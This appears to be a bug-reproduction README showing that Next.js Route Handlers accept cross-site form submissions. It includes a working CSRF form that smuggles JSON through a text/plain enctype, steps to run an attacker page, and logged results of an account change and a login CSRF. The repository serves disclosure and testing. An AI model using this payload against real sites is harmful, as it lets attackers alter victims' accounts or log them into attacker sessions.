# Next.js Route Handlers accept cross-site form submissions

Reproduction for https://github.com/vercel/next.js/discussions/101245

A page on another site submits an HTML form to a Next.js Route Handler. The form sends valid JSON with `Content-Type: text/plain`, which `request.json()` parses, so the browser sends no `OPTIONS` preflight:

```html
<form action="http://localhost:3000/csrf-account" method="POST" enctype="text/plain">
  <input type="hidden" name='{"displayName":"Changed by cross-site form","padding":"' value='"}'>
  <button>Submit cross-site change</button>
</form>
```

The browser sends this body:

```text
{"displayName":"Changed by cross-site form","padding":"="}
```

The Route Handlers contain no CORS configuration, `Origin` check or CSRF token check, as documented in the [`route.js` Request Body example](https://nextjs.org/docs/app/api-reference/file-conventions/route#request-body).

## Steps to reproduce

1. Install dependencies: `pnpm install`
2. Build and start Next.js on `localhost:3000`: `pnpm build && pnpm start`
3. In a second terminal, start the attacker pages on `127.0.0.1:3001` (a different site): `pnpm attacker-site`
4. In a third terminal, run the browser checks with Chrome: `pnpm check-csrf`

`pnpm check-csrf` logs in as `victim` with a same-origin `fetch()`, submits each attacker form and reads the result back with a same-origin request:

```bash
$ pnpm check-csrf
$ node check-csrf.ts
Browser: 156.0.8078.80
{"case":"account change","sameSite":"None","crossSiteStatus":200,"displayNameAfter":"Changed by cross-site form"}
{"case":"account change","sameSite":"Lax","crossSiteStatus":401,"displayNameAfter":"Original name"}
{"case":"login","sameSite":"Lax","crossSiteStatus":200,"userBefore":"victim","userAfter":"attacker"}
```

Observed on Next.js 16.4.1 with both `next dev` and `next build` + `next start`.

## 1. Acting as the logged-in visitor (`SameSite=None` session cookie)

`app/csrf-account/route.ts` sets the session cookie with:

```text
Set-Cookie: csrfDemoSession=<random UUID>; HttpOnly; Secure; SameSite=None; Path=/
```

The browser sends this cookie with the cross-site form. The `POST` handler changes the display name and returns `200`.

With `SameSite=Lax`, the browser doesn't send the cookie and the handler returns `401`.

## 2. Logging the visitor in as the attacker (`SameSite=Lax` session cookie)

`app/login/route.ts` sets the session cookie with:

```text
Set-Cookie: demoSession=<username>; HttpOnly; Secure; SameSite=Lax; Path=/
```

The cross-site form posts the attacker's credentials. The response replaces the victim's session cookie, so the victim is now logged in as `attacker` (login CSRF). `SameSite=Lax` doesn't prevent this, because the attack needs no existing cookie.

Chrome allows `Secure` cookies on `localhost`. A deployed app needs HTTPS.
